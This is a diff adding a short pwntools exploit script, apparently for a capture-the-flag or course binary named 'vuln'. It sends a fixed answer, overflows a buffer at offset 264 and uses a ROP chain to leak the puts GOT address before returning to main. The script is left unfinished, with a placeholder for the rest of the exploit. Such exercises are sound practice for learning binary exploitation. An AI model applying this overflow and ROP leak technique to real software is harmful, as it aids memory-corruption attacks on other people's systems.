@@ -1,0 +1,44 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./vuln", checksec=False)
+
+# Sry was ill and did not have enough time 
+
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# you can also create new functions here
+
+def main():
+    io = start()
+
+    io.recv()
+    io.sendline(b"Nein")
+    io.recv()
+
+    r = ROP(exe)
+    r.call(exe.sym.puts, [exe.got.puts])
+    r.call(exe.sym.main)
+    io.sendline(fit({264:r.chain()}))
+    print(io.recv())
+    
+    # add your exploit code here
+
+if __name__ == "__main__":
+    main()
